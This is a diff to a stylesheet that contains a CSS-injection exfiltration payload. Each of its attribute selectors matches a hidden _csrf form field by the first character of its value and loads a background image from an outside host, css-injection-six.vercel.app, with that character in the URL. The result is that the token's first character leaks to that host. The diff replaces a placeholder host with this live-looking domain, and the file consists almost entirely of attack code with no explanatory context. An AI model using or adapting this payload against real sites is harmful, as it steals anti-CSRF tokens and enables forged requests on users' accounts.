@@ -8,185 +8,185 @@ body{
   }
 
 input[type=hidden][name=_csrf][value^="1"] ~ * {
-  background-image: url(https://myserver.com?q=1);
+  background-image: url(https://css-injection-six.vercel.app?q=1);
 }
 input[type=hidden][name=_csrf][value^="2"] ~ * {
-  background-image: url(https://myserver.com?q=2);
+  background-image: url(https://css-injection-six.vercel.app?q=2);
 }
 input[type=hidden][name=_csrf][value^="3"] ~ * {
-  background-image: url(https://myserver.com?q=3);
+  background-image: url(https://css-injection-six.vercel.app?q=3);
 }
 input[type=hidden][name=_csrf][value^="4"] ~ * {
-  background-image: url(https://myserver.com?q=4);
+  background-image: url(https://css-injection-six.vercel.app?q=4);
 }
 input[type=hidden][name=_csrf][value^="5"] ~ * {
-  background-image: url(https://myserver.com?q=5);
+  background-image: url(https://css-injection-six.vercel.app?q=5);
 }
 input[type=hidden][name=_csrf][value^="6"] ~ * {
-  background-image: url(https://myserver.com?q=6);
+  background-image: url(https://css-injection-six.vercel.app?q=6);
 }
 input[type=hidden][name=_csrf][value^="7"] ~ * {
-  background-image: url(https://myserver.com?q=7);
+  background-image: url(https://css-injection-six.vercel.app?q=7);
 }
 input[type=hidden][name=_csrf][value^="8"] ~ * {
-  background-image: url(https://myserver.com?q=8);
+  background-image: url(https://css-injection-six.vercel.app?q=8);
 }
 input[type=hidden][name=_csrf][value^="9"] ~ * {
-  background-image: url(https://myserver.com?q=9);
+  background-image: url(https://css-injection-six.vercel.app?q=9);
 }
 input[type=hidden][name=_csrf][value^="a"] ~ * {
-  background-image: url(https://myserver.com?q=a);
+  background-image: url(https://css-injection-six.vercel.app?q=a);
 }
 input[type=hidden][name=_csrf][value^="b"] ~ * {
-  background-image: url(https://myserver.com?q=b);
+  background-image: url(https://css-injection-six.vercel.app?q=b);
 }
 input[type=hidden][name=_csrf][value^="c"] ~ * {
-  background-image: url(https://myserver.com?q=c);
+  background-image: url(https://css-injection-six.vercel.app?q=c);
 }
 input[type=hidden][name=_csrf][value^="d"] ~ * {
-  background-image: url(https://myserver.com?q=d);
+  background-image: url(https://css-injection-six.vercel.app?q=d);
 }
 input[type=hidden][name=_csrf][value^="e"] ~ * {
-  background-image: url(https://myserver.com?q=e);
+  background-image: url(https://css-injection-six.vercel.app?q=e);
 }
 input[type=hidden][name=_csrf][value^="f"] ~ * {
-  background-image: url(https://myserver.com?q=f);
+  background-image: url(https://css-injection-six.vercel.app?q=f);
 }
 input[type=hidden][name=_csrf][value^="g"] ~ * {
-  background-image: url(https://myserver.com?q=g);
+  background-image: url(https://css-injection-six.vercel.app?q=g);
 }
 input[type=hidden][name=_csrf][value^="h"] ~ * {
-  background-image: url(https://myserver.com?q=h);
+  background-image: url(https://css-injection-six.vercel.app?q=h);
 }
 input[type=hidden][name=_csrf][value^="i"] ~ * {
-  background-image: url(https://myserver.com?q=i);
+  background-image: url(https://css-injection-six.vercel.app?q=i);
 }
 input[type=hidden][name=_csrf][value^="j"] ~ * {
-  background-image: url(https://myserver.com?q=j);
+  background-image: url(https://css-injection-six.vercel.app?q=j);
 }
 input[type=hidden][name=_csrf][value^="k"] ~ * {
-  background-image: url(https://myserver.com?q=k);
+  background-image: url(https://css-injection-six.vercel.app?q=k);
 }
 input[type=hidden][name=_csrf][value^="l"] ~ * {
-  background-image: url(https://myserver.com?q=l);
+  background-image: url(https://css-injection-six.vercel.app?q=l);
 }
 input[type=hidden][name=_csrf][value^="m"] ~ * {
-  background-image: url(https://myserver.com?q=m);
+  background-image: url(https://css-injection-six.vercel.app?q=m);
 }
 input[type=hidden][name=_csrf][value^="n"] ~ * {
-  background-image: url(https://myserver.com?q=n);
+  background-image: url(https://css-injection-six.vercel.app?q=n);
 }
 input[type=hidden][name=_csrf][value^="o"] ~ * {
-  background-image: url(https://myserver.com?q=o);
+  background-image: url(https://css-injection-six.vercel.app?q=o);
 }
 input[type=hidden][name=_csrf][value^="p"] ~ * {
-  background-image: url(https://myserver.com?q=p);
+  background-image: url(https://css-injection-six.vercel.app?q=p);
 }
 input[type=hidden][name=_csrf][value^="q"] ~ * {
-  background-image: url(https://myserver.com?q=q);
+  background-image: url(https://css-injection-six.vercel.app?q=q);
 }
 input[type=hidden][name=_csrf][value^="r"] ~ * {
-  background-image: url(https://myserver.com?q=r);
+  background-image: url(https://css-injection-six.vercel.app?q=r);
 }
 input[type=hidden][name=_csrf][value^="s"] ~ * {
-  background-image: url(https://myserver.com?q=s);
+  background-image: url(https://css-injection-six.vercel.app?q=s);
 }
 input[type=hidden][name=_csrf][value^="t"] ~ * {
-  background-image: url(https://myserver.com?q=t);
+  background-image: url(https://css-injection-six.vercel.app?q=t);
 }
 input[type=hidden][name=_csrf][value^="u"] ~ * {
-  background-image: url(https://myserver.com?q=u);
+  background-image: url(https://css-injection-six.vercel.app?q=u);
 }
 input[type=hidden][name=_csrf][value^="v"] ~ * {
-  background-image: url(https://myserver.com?q=v);
+  background-image: url(https://css-injection-six.vercel.app?q=v);
 }
 input[type=hidden][name=_csrf][value^="w"] ~ * {
-  background-image: url(https://myserver.com?q=w);
+  background-image: url(https://css-injection-six.vercel.app?q=w);
 }
 input[type=hidden][name=_csrf][value^="x"] ~ * {
-  background-image: url(https://myserver.com?q=x);
+  background-image: url(https://css-injection-six.vercel.app?q=x);
 }
 input[type=hidden][name=_csrf][value^="y"] ~ * {
-  background-image: url(https://myserver.com?q=y);
+  background-image: url(https://css-injection-six.vercel.app?q=y);
 }
 input[type=hidden][name=_csrf][value^="z"] ~ * {
-  background-image: url(https://myserver.com?q=z);
+  background-image: url(https://css-injection-six.vercel.app?q=z);
 }
 input[type=hidden][name=_csrf][value^="A"] ~ * {
-  background-image: url(https://myserver.com?q=A);
+  background-image: url(https://css-injection-six.vercel.app?q=A);
 }
 input[type=hidden][name=_csrf][value^="B"] ~ * {
-  background-image: url(https://myserver.com?q=B);
+  background-image: url(https://css-injection-six.vercel.app?q=B);
 }
 input[type=hidden][name=_csrf][value^="C"] ~ * {
-  background-image: url(https://myserver.com?q=C);
+  background-image: url(https://css-injection-six.vercel.app?q=C);
 }
 input[type=hidden][name=_csrf][value^="D"] ~ * {
-  background-image: url(https://myserver.com?q=D);
+  background-image: url(https://css-injection-six.vercel.app?q=D);
 }
 input[type=hidden][name=_csrf][value^="E"] ~ * {
-  background-image: url(https://myserver.com?q=E);
+  background-image: url(https://css-injection-six.vercel.app?q=E);
 }
 input[type=hidden][name=_csrf][value^="F"] ~ * {
-  background-image: url(https://myserver.com?q=F);
+  background-image: url(https://css-injection-six.vercel.app?q=F);
 }
 input[type=hidden][name=_csrf][value^="G"] ~ * {
-  background-image: url(https://myserver.com?q=G);
+  background-image: url(https://css-injection-six.vercel.app?q=G);
 }
 input[type=hidden][name=_csrf][value^="H"] ~ * {
-  background-image: url(https://myserver.com?q=H);
+  background-image: url(https://css-injection-six.vercel.app?q=H);
 }
 input[type=hidden][name=_csrf][value^="I"] ~ * {
-  background-image: url(https://myserver.com?q=I);
+  background-image: url(https://css-injection-six.vercel.app?q=I);
 }
 input[type=hidden][name=_csrf][value^="J"] ~ * {
-  background-image: url(https://myserver.com?q=J);
+  background-image: url(https://css-injection-six.vercel.app?q=J);
 }
 input[type=hidden][name=_csrf][value^="K"] ~ * {
-  background-image: url(https://myserver.com?q=K);
+  background-image: url(https://css-injection-six.vercel.app?q=K);
 }
 input[type=hidden][name=_csrf][value^="L"] ~ * {
-  background-image: url(https://myserver.com?q=L);
+  background-image: url(https://css-injection-six.vercel.app?q=L);
 }
 input[type=hidden][name=_csrf][value^="M"] ~ * {
-  background-image: url(https://myserver.com?q=M);
+  background-image: url(https://css-injection-six.vercel.app?q=M);
 }
 input[type=hidden][name=_csrf][value^="N"] ~ * {
-  background-image: url(https://myserver.com?q=N);
+  background-image: url(https://css-injection-six.vercel.app?q=N);
 }
 input[type=hidden][name=_csrf][value^="O"] ~ * {
-  background-image: url(https://myserver.com?q=O);
+  background-image: url(https://css-injection-six.vercel.app?q=O);
 }
 input[type=hidden][name=_csrf][value^="P"] ~ * {
-  background-image: url(https://myserver.com?q=P);
+  background-image: url(https://css-injection-six.vercel.app?q=P);
 }
 input[type=hidden][name=_csrf][value^="Q"] ~ * {
-  background-image: url(https://myserver.com?q=Q);
+  background-image: url(https://css-injection-six.vercel.app?q=Q);
 }
 input[type=hidden][name=_csrf][value^="R"] ~ * {
-  background-image: url(https://myserver.com?q=R);
+  background-image: url(https://css-injection-six.vercel.app?q=R);
 }
 input[type=hidden][name=_csrf][value^="S"] ~ * {
-  background-image: url(https://myserver.com?q=S);
+  background-image: url(https://css-injection-six.vercel.app?q=S);
 }
 input[type=hidden][name=_csrf][value^="T"] ~ * {
-  background-image: url(https://myserver.com?q=T);
+  background-image: url(https://css-injection-six.vercel.app?q=T);
 }
 input[type=hidden][name=_csrf][value^="U"] ~ * {
-  background-image: url(https://myserver.com?q=U);
+  background-image: url(https://css-injection-six.vercel.app?q=U);
 }
 input[type=hidden][name=_csrf][value^="V"] ~ * {
-  background-image: url(https://myserver.com?q=V);
+  background-image: url(https://css-injection-six.vercel.app?q=V);
 }
 input[type=hidden][name=_csrf][value^="W"] ~ * {
-  background-image: url(https://myserver.com?q=W);
+  background-image: url(https://css-injection-six.vercel.app?q=W);
 }
 input[type=hidden][name=_csrf][value^="X"] ~ * {
-  background-image: url(https://myserver.com?q=X);
+  background-image: url(https://css-injection-six.vercel.app?q=X);
 }
 input[type=hidden][name=_csrf][value^="Y"] ~ * {
-  background-image: url(https://myserver.com?q=Y);
+  background-image: url(https://css-injection-six.vercel.app?q=Y);
 }
 input[type=hidden][name=_csrf][value^="Z"] ~ * {
-  background-image: url(https://myserver.com?q=Z);
+  background-image: url(https://css-injection-six.vercel.app?q=Z);
 }
